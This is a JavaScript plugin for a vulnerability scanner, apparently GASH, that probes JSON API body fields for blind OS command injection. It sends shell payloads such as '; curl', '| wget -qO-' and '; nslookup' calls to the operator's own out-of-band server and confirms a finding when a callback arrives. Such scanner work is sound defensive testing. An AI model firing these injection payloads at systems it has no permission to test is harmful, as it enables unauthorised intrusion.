/* ---
id: command-injection-json-body-oob
name: Command Injection via JSON Body Field (OOB)
description: Detects blind OS command injection in JSON API body fields by injecting shell callback payloads with a unique out-of-band token per variant and skipping honestly when no OOB server is configured.
author: GASH contributors
severity: critical
tags: [command-injection, injection, blind, oob, rce, json]
safe: false
deep: false
active: true
requires_auth: false
phase: probe
order: 72
oob: required
api_version: "1.0"
tests: tests/fixtures/command-injection-json-body-oob/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/command-injection/command-injection-json-body-oob.js
// What: Tier 2 blind command-injection plugin for JSON request bodies.
// Why: JSON fields (filename, format, target, source) are routinely passed to
//   media converters and shell helpers, but Tier 1 cannot rebuild a JSON object
//   around a discovered field. Every variant carries its own single-use token,
//   so a callback can only confirm the exact request that caused it. Confirmed
//   ONLY on a callback match; there is no timing fallback.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const jsonContentType = "application/json";
  const maxSends = 40;
  const sent = [];

  // Shell payload builders; each receives a fresh token object. Callbacks are
  // harmless DNS/HTTP requests to the operator's own server.
  const builders = [
    function (o) { return "; curl " + o.url; },
    function (o) { return "| curl " + o.url; },
    function (o) { return "`curl " + o.url + "`"; },
    function (o) { return "; wget -qO- " + o.url; },
    function (o) { return "| wget -qO- " + o.url; },
    function (o) { return "; nslookup " + o.domain; },
    function (o) { return "| nslookup " + o.domain; },
  ];

  for (const point of points) {
    if (sent.length >= maxSends) {
      break;
    }
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    const name = point.paramName;
    for (const build of builders) {
      if (sent.length >= maxSends) {
        break;
      }
      const oob = host.oob.generate("http");
      if (!oob) {
        // No self-hosted OOB server: the scheduler should have skipped this
        // plugin; returning empty keeps the discipline even if it did not.
        return [];
      }
      const payload = build(oob);
      probe.send({
        url: point.url,
        method: point.method,
        paramName: "",
        paramLocation: "body",
        value: '{"' + name + '":"' + payload + '"}',
        headers: { "Content-Type": jsonContentType },
      });
      sent.push({ corr: oob.correlationId, ns: oob.namespace, point: point, payload: payload });
    }
  }
  if (sent.length === 0) {
    return [];
  }

  // ONE shared bounded window for the whole corpus (10s / 2 polls): DNS-only
  // exfil confirms exactly like HTTP because each token is unique.
  const ids = [];
  for (const s of sent) {
    ids.push(s.corr);
  }
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (const s of sent) {
    if (s.corr === String(ev.correlationId)) {
      return [host.candidate(s.point, "oob", ev)];
    }
  }
  return [];
}
